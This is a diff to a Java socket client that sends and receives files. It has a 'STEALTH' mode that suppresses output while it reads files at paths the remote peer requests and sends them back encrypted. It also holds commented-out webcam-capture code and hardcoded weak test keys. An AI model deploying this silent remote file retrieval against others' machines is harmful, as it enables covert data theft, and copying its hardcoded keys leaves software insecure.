@@ -29,7 +29,7 @@ class Client
     private final String DESKTOP = System.getProperty("user.home") + "/Desktop";
     private String DOWNLOAD_DIR = DESKTOP + "/"; // Set the downloaded file directory to desktop initially
     private final int MB = 1024 * 1024;
-    private enum MODE {STEALTH, NORMAL}
+    enum MODE {STEALTH, NORMAL}
     private MODE mode;
     // Encryption Key same as used in the server you're connecting to..(shared with the server)
     private Key serverKey;
@@ -40,15 +40,17 @@ class Client
     This constructor won't create a special folder for the downloaded files, the default path (Desktop) will be selected instead
     @para Socket
 */
-Client(Socket socket, MODE mode, String serverKey, String thisKey)
+Client(Socket socket, MODE mode, String[] keys)
 {
-    if(serverKey.length() < 16 || thisKey.length() < 16)
+    if(keys[0].length() < 16 || keys[1].length() < 16)
     {
         System.err.println("The encryption keys are incorrect (not 128 bit keys)");
         System.exit(1);
     }
-    this.serverKey = Utilities.generateKey(serverKey);
-    this.thisKey = Utilities.generateKey(thisKey);
+
+    this.serverKey = Utilities.generateKey(keys[0]);
+    this.thisKey = Utilities.generateKey(keys[1]);
+
     connect(socket);
     this.mode = mode;
     if(mode.equals(MODE.NORMAL)) System.out.println("> Connected to: " + socket.getInetAddress());
@@ -59,15 +61,16 @@ Client(Socket socket, MODE mode, String serverKey, String thisKey)
     @para Socket
     @para folder "Title only not a full path"
 */
-Client(Socket socket, String folder, MODE mode, String serverKey, String thisKey)
+Client(Socket socket, String folder, MODE mode, String[] keys)
 {
-    if(serverKey.length() < 16 || thisKey.length() < 16)
+    if(keys[0].length() < 16 || keys[1].length() < 16)
     {
         System.err.println("The encryption keys are incorrect (not 128 bit keys)");
         System.exit(1);
     }
-    this.serverKey = Utilities.generateKey(serverKey);
-    this.thisKey = Utilities.generateKey(thisKey);
+
+    this.serverKey = Utilities.generateKey(keys[0]);
+    this.thisKey = Utilities.generateKey(keys[1]);
 
     DOWNLOAD_DIR = DESKTOP + "/" + folder + "/";
     File file = new File(DOWNLOAD_DIR);
@@ -115,7 +118,7 @@ private byte[] getObject()
     }
     return null;
 }
-private void sendObject(byte[] bytes)
+protected void sendObject(byte[] bytes)
 {
     ObjectOutputStream out = null;
     try
@@ -167,8 +170,8 @@ void listen()
                         {
                             fileBytes = Base64.getDecoder().decode(json.getString("data"));
                             // Write the file to the hard disk
-                            Utilities.writeFile(fileBytes, DOWNLOAD_DIR + json.get("file_name") +"."+ json.get("file_extension"));
-                        } catch (JSONException e) {
+                            Utilities.writeFile(fileBytes, DOWNLOAD_DIR + json.getString("file_name") + ((json.getString("file_extension").length()>0) ? "." + json.getString("file_extension") : ""));
+                        } catch (Exception e) {
                             e.printStackTrace();
                         }
                         if(mode == MODE.NORMAL)
@@ -186,14 +189,11 @@ void listen()
                                 try {
                                     absPath = json.getString("path");
                                     byte[] file_Bytes = Utilities.readFile(absPath);
-                                    if(file_Bytes == null)
-                                    {
-                                        if(mode == MODE.NORMAL)
-                                            System.err.println("Couldn't get the file at: "+ absPath);
-                                    }
+                                    if (file_Bytes == null && mode == MODE.NORMAL)
+                                        System.err.println("File requested doesn't exists");
                                     JSONObject toSend = new JSONObject();
                                     toSend.put("type","file");
-                                    toSend.put("data", Base64.getEncoder().encodeToString(file_Bytes));
+                                    toSend.put("data", Base64.getEncoder().encodeToString((file_Bytes == null ? new byte[0] : file_Bytes)));
                                     if(absPath.contains("."))
                                     {
                                         toSend.put("file_name",absPath.substring(absPath.lastIndexOf('/') + 1, absPath.lastIndexOf('.')));
@@ -202,7 +202,8 @@ void listen()
                                     else
                                     {
                                         toSend.put("file_name",absPath.substring(absPath.lastIndexOf('/') + 1, absPath.length()));
-                                        toSend.put("file_extension","zip");
+                                        File file = new File(absPath);
+                                        toSend.put("file_extension",(file.isDirectory() ? "zip" : ""));
                                     }
                                     // Encrypt with serverKey and send it to the server
                                     sendObject(Utilities.encrypt(toSend.toString().getBytes(), serverKey));
@@ -251,7 +252,6 @@ private void console() throws IOException {
                 case "upload ":
                     String absPath = scanner.findInLine(rx);
                     byte[] fileBytes = Utilities.readFile(absPath.substring(1, absPath.lastIndexOf('\"')));
-                    System.out.println("file read");
                     if(fileBytes == null)
                     {
                         if(mode == MODE.NORMAL)
@@ -313,34 +313,35 @@ private String getDOWNLOAD_DIR()
 }
 public static void main (String[]args)throws Exception
 {
-//    ServerSocket server = new ServerSocket(1234);
-//    new Thread(() -> {
-//        Client c2 = null;
-//        while(c2==null) try {
-//            c2 = new Client(server.accept(), MODE.STEALTH);
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        }
-//    }).start();
-//    Client c1 = new Client(new Socket("localhost",1234), "custom",MODE.NORMAL);
-//    c1.console();
-//    c1.close();
+    String serverKey = "1234567890123456", thisKey = "123456789012345g";
+    ServerSocket server = new ServerSocket(1234);
+    new Thread(() -> {
+        Client c2 = null;
+        while(c2==null) try {
+            c2 = new Client(server.accept(), MODE.STEALTH, new String[]{serverKey,thisKey});
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }).start();
+    Client c1 = new Client(new Socket("localhost",1234), "custom",MODE.NORMAL, new String[]{serverKey, thisKey});
+    c1.console();
+    c1.close();
 
-    Webcam webcam = Webcam.getWebcams().get(0);
-    webcam.setViewSize(WebcamResolution.VGA.getSize());
-
-    WebcamPanel panel = new WebcamPanel(webcam);
-    panel.setFPSDisplayed(true);
-    panel.setDisplayDebugInfo(true);
-    panel.setImageSizeDisplayed(true);
-    panel.setMirrored(true);
-
-    JFrame window = new JFrame("Omid you're sleepy");
-    window.add(panel);
-    window.setResizable(true);
-    window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-    window.pack();
-    window.setVisible(true);
+//    Webcam webcam = Webcam.getWebcams().get(0);
+//    webcam.setViewSize(WebcamResolution.VGA.getSize());
+//
+//    WebcamPanel panel = new WebcamPanel(webcam);
+//    panel.setFPSDisplayed(true);
+//    panel.setDisplayDebugInfo(true);
+//    panel.setImageSizeDisplayed(true);
+//    panel.setMirrored(true);
+//
+//    JFrame window = new JFrame("Omid you're sleepy");
+//    window.add(panel);
+//    window.setResizable(true);
+//    window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+//    window.pack();
+//    window.setVisible(true);
 
 
 }
